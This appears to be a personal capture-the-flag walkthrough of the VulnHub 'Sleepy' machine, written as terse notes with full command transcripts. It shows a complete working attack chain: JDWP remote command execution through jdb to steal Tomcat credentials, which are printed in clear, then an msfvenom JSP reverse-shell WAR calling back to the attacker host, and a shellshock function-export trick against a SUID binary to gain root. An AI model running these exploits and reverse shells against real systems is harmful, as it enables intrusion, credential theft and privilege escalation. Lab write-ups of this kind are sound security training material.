https://g0blin.co.uk/devrandom-sleepy-vulnhub-writeup/
http://devloop.users.sourceforge.net/index.php?article138/solution-du-ctf-dev-random-sleepy-de-vulnhub

https://highon.coffee/blog/sleepy-ctf-walkthrough/

https://www.serma-safety-security.com/vulnerabilite-critique-sur-bash-cve-2014-6271-shellshock/

https://www.minttm.com/takeover-shellshocker-net


Machines :  shellshock, symfonos 2, sleepy
Keys : Java Debug Wire Protocol (JDWP) version 1.6 1.7.0_71, tomcat, Apache Tomcat Proxy, shellshock, bash-4.2

# Scan

	└─$ sudo nmap -sT -A -p- -Pn -sV 192.168.56.6
	Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-18 16:04 CET
	Stats: 0:02:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
	Nmap scan report for 192.168.56.6
	Host is up (0.00022s latency).
	Not shown: 65532 filtered tcp ports (no-response)
	PORT     STATE SERVICE VERSION
	21/tcp   open  ftp     vsftpd 2.0.8 or later
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to 192.168.56.1
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 1
	|      vsFTPd 3.0.2 - secure, fast, stable
	|_End of status
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	|_Can't get directory listing: TIMEOUT
	8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
	|_ajp-methods: Failed to get a valid response for the OPTION request
	9001/tcp open  jdwp    Java Debug Wire Protocol (Reference Implementation) version 1.6 1.7.0_71
	|_jdwp-info: ERROR: Script execution failed (use -d to debug)
	MAC Address: 08:00:27:00:AC:78 (Oracle VirtualBox virtual NIC)
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Device type: general purpose
	Running: Linux 2.6.X|3.X
	OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
	OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13, Linux 3.4 - 3.10
	Network Distance: 1 hop

	TRACEROUTE
	HOP RTT     ADDRESS
	1   0.22 ms 192.168.56.6

	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 148.19 seconds


# FTP connexion

	$ ftp 192.168.56.6
	Connected to 192.168.56.6.
	220 ZzZZzZzz FTP
	Name (192.168.56.6:kali): ftp
	331 Please specify the password.
	Password:
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> ls
	200 PORT command successful. Consider using PASV.
	150 Here comes the directory listing.
	drwxrwxrwx    2 0        1002           23 Jun 19  2015 pub
	226 Directory send OK.
	ftp> cd pub
	250 Directory successfully changed.
	ftp> ls
	200 PORT command successful. Consider using PASV.
	150 Here comes the directory listing.
	-rw-r--r--    1 1002     1002       120456 Jun 18  2015 sleepy.png
	226 Directory send OK.
	ftp> get sleepy.png 
	local: sleepy.png remote: sleepy.png
	200 PORT command successful. Consider using PASV.
	150 Opening BINARY mode data connection for sleepy.png (120456 bytes).
	226 Transfer complete.
	120456 bytes received in 0.01 secs (16.4508 MB/s)
	ftp> put sleepy.png  s.png
	local: sleepy.png remote: s.png
	200 PORT command successful. Consider using PASV.
	550 Permission denied.

Default path of vsftpd is : __/var/ftp/pub/__

# JDWP exploit 

## Install jdb

	sudo apt install -y default-jdk

## Exploit

Copy the file _/etc/tomcat/tomcat-users.xml_ to _/var/ftp/pub/_

	$ jdb -attach 192.168.56.6:9001
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	Set uncaught java.lang.Throwable
	Set deferred uncaught java.lang.Throwable
	Initializing jdb ...
	> threads
	Group system:
	  (java.lang.ref.Reference$ReferenceHandler)0x19e Reference Handler cond. waiting
	  (java.lang.ref.Finalizer$FinalizerThread)0x19f  Finalizer         cond. waiting
	  (java.lang.Thread)0x1a0                         Signal Dispatcher running
	Group main:
	  (java.lang.Thread)0x1                           main              sleeping
	> interrupt 0x1
	> 
	Exception occurred: java.lang.InterruptedException (uncaught)"thread=main", java.lang.Thread.sleep(), line=-1 bci=-1

	main[1] print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("cp /etc/tomcat/tomcat-users.xml /var/ftp/pub/").getInputStream())).readLine())
	...
	main[1] exit

tomcat-users.xml

	user username="sl33py" password="Gu3SSmYStR0NgPa$sw0rD!" roles="tomcat,manager-gui,admin-gui,admin,manager-jmx,admin-script,manager,manager-script,manager-status"/>


## Install Apache Tomcat Proxy

    apt-get install libapache2-mod-jk -y
    sed -i 's#JkWorkersFile /etc/libapache2-mod-jk/workers.properties#JkWorkersFile /etc/apache2/workers.properties#g' /etc/apache2/mods-enabled/jk.conf
    cp /etc/libapache2-mod-jk/workers.properties /etc/apache2/
    sed -i 's#worker.ajp13_worker.host=localhost#worker.ajp13_worker.host=192.168.30.146#g' /etc/apache2/workers.properties
    sed  -i '/\Host\>/i JKMount /* ajp13_worker' /etc/apache2/sites-enabled/000-default.conf
    a2enmod proxy_http proxy_ajp
    service apache2 restart


## Connect to Tomcat Web Application Manager with sl33py / Gu3SSmYStR0NgPa$sw0rD!

### Generate shell

	msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=1234 -f war > shell.war

### Upload shell

	http://localhost --> Manager App --> sl33py / Gu3SSmYStR0NgPa$sw0rD! --> WAR file to deploy --> http://localhost/shell


## upgrade shell

	python -c 'import pty;pty.spawn("/bin/bash")'
	$ ^Z
	debian@debian:~$ echo $TERM
	xterm-256color
	debian@debian:~$ stty -a
	...rows 27; columns 105; ...
	debian@debian:~$ stty raw -echo
	debian@debian:~$ fg
	debian@debian:~$ nc -lvp 1234
	                             reset
	reset: unknown terminal type unknown
	Terminal type? xterm-256color
	bash-4.2$ export TERM=xterm-256color
	bash-4.2$ export SHELL=bash
	bash-4.2$ stty rows 27 columns 105

# Get root

## SUID file

	find / -perm -u=s -type f 2>/dev/null | xargs ls -l
	-rwsr-xr-x. 1 root root    64176 Jun 10  2014 /usr/bin/chage
	-rws--x--x. 1 root root    23960 Jun 18  2014 /usr/bin/chfn
	-rws--x--x. 1 root root    23856 Jun 18  2014 /usr/bin/chsh
	-rwsr-xr-x. 1 root root    57536 Jun 10  2014 /usr/bin/crontab
	-rwsr-xr-x. 1 root root    78168 Jun 10  2014 /usr/bin/gpasswd
	-rwsr-xr-x. 1 root root    44232 Jun 18  2014 /usr/bin/mount
	-rwsr-xr-x. 1 root root    37624 Jun 10  2014 /usr/bin/newgrp
	-rwsr-s---. 1 root tomcat   8669 Jan 18  2015 /usr/bin/nightmare <== HERE
	-rwsr-xr-x. 1 root root    27832 Jun 10  2014 /usr/bin/passwd
	-rwsr-xr-x. 1 root root    27656 Jun 10  2014 /usr/bin/pkexec
	-rwsr-xr-x. 1 root root    32032 Jun 18  2014 /usr/bin/su
	---s--x--x. 1 root root   130712 Jun 10  2014 /usr/bin/sudo
	-rwsr-xr-x. 1 root root    31960 Jun 18  2014 /usr/bin/umount
	-rwsr-x---. 1 root dbus   318384 Jun 10  2014 /usr/lib64/dbus-1/dbus-daemon-launch-helper
	-rwsr-xr-x. 1 root root    15416 Jun 10  2014 /usr/lib/polkit-1/polkit-agent-helper-1
	-rwsr-xr-x. 1 root root    11208 Jun 18  2014 /usr/sbin/pam_timestamp_check
	-rwsr-xr-x. 1 root root    36264 Jun 18  2014 /usr/sbin/unix_chkpwd
	-rwsr-xr-x. 1 root root    11272 Aug 26  2014 /usr/sbin/usernetctl

##  Commands used

	strings /usr/bin/nightmare
	...
	/usr/bin/sl -al <== HERE
	/usr/bin/aafire
	...



## Exploit shellshock bash-4.2

	bash-4.2$ env x='() { :;}; echo vulnerable' bash -c "echo test"
	bash-4.2$ id
	uid=91(tomcat) gid=91(tomcat) groups=91(tomcat) context=system_u:system_r:tomcat_t:s0
	bash-4.2$ function /usr/bin/sl () { /bin/bash; }
	bash-4.2$ export -f /usr/bin/sl
	bash-4.2$ /usr/bin/nightmare
	[+] Again [y/n]? ^Cbash-4.2# id
	uid=0(root) gid=0(root) groups=0(root),91(tomcat) context=system_u:system_r:tomcat_t:s0




# Box

## iptables

	bash-4.2# iptables -L
	Chain INPUT (policy DROP)
	target     prot opt source               destination         
	ACCEPT     all  --  anywhere             anywhere            
	ACCEPT     all  --  anywhere             anywhere             state RELATED,ESTABLISHED
	ACCEPT     tcp  --  anywhere             anywhere             state NEW tcp dpt:ftp
	ACCEPT     tcp  --  anywhere             anywhere             state NEW tcp dpt:etlservicemgr
	ACCEPT     tcp  --  anywhere             anywhere             state NEW tcp dpt:8009

	Chain FORWARD (policy DROP)
	target     prot opt source               destination         

	Chain OUTPUT (policy ACCEPT)
	target     prot opt source               destination         
	ACCEPT     all  --  anywhere             anywhere            
	ACCEPT     all  --  anywhere             anywhere             state RELATED,ESTABLISHED
	DROP       all  --  anywhere             anywhere             owner UID match sleepy



	bash-4.2# cat  /etc/sysconfig/iptables
	# sample configuration for iptables service
	# you can edit this manually or use system-config-firewall
	# please do not ask us to add additional ports/services to this default configuration
	*filter
	:INPUT DROP [0:0]
	:FORWARD DROP [0:0]
	:OUTPUT ACCEPT [0:0]
	-A INPUT -i lo -j ACCEPT
	-A OUTPUT -o lo -j ACCEPT

	-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
	-A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

	-A INPUT -p tcp -m state --state NEW -m tcp --dport 21 -j ACCEPT
	-A INPUT -p tcp -m state --state NEW -m tcp --dport 9001 -j ACCEPT
	-A INPUT -p tcp -m state --state NEW -m tcp --dport 8009 -j ACCEPT

	-A OUTPUT -o enp0s3 -m owner --uid-owner sleepy -j DROP

	COMMIT

## netstat


	bash-4.2# netstat -ntlp
	Active Internet connections (only servers)
	Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
	tcp        0      0 0.0.0.0:9001            0.0.0.0:*               LISTEN      1357/java           
	tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      831/vsftpd          
	tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      1320/java           
	tcp6       0      0 :::8009                 :::*                    LISTEN      1320/java           
	tcp6       0      0 :::8080                 :::*                    LISTEN      1320/java

## Forward port 8080

	ssh-keygen -P "" -f key
	bash-4.2$ ssh -N -f -R 8080:127.0.0.1:8080 kali@192.168.56.1 -i key

